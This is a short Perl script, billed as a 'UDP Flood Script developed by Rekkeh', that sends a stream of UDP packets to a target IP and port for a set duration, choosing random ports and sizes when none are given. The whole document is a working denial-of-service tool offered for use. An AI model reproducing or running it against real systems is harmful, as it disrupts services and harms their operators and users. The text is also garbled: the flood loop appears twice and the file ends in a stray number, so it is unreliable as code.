use Socket;

my ($ip,$port,$size,$time) = @ARGV;
my ($iaddr,$endtime,$psize,$pport);
my $packetstring = '#' x $size;
$iaddr = inet_aton("$ip") or die "Invalid IP\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print "UDP Flood Script developed by Rekkeh\n";
print "Sent attack to $ip " . ($port ? $port : "random") . " with " .
($size ? "$size-byte" : "that good-good") . " " .
($time ? "for $time seconds" : "") . "\n";

for (;time() <= $endtime;) {
$psize = $size ? $size : int(rand(1024-64)+64) ;
$pport = $port ? $port : int(rand(65500))+1;

send(flood, pack("a$psize",$packetstring), 0, pack_sockaddr_in($pport,$iaddr));}for (;time() <= $endtime;) {
$psize = $size ? $size : int(rand(1024-64)+64) ;
$pport = $port ? $port : int(rand(65500))+1;

send(flood, pack("a$psize",$packetstring), 0, pack_sockaddr_in($pport,
$iaddr));}986